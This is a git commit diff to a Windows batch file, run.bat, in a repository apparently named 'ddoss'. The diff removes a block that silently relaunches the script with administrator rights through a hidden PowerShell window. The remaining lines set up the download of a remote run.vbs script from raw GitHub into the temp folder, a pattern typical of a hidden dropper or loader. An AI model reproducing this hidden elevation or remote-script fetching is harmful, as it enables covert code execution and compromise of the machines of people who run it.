b3f62c4283095eac3ad41b7b973cb5ecc28afab9
srap18 <48030957+srap18@users.noreply.github.com>
2025-08-08 22:45:42 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,9 +1,4 @@
 @echo off
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
-    exit /b
-)
 
 set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
 set "temp=%temp%\run.vbs"
